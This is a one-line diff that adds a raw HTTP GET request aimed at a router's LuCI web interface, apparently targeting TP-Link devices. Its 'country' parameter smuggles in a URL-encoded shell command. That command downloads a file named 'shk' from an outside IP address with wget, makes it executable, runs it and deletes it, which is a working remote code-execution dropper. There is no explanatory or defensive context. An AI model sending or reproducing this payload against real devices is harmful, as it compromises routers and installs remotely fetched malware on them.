@@ -1,0 +1,1 @@
+GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F50.3.182.152%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
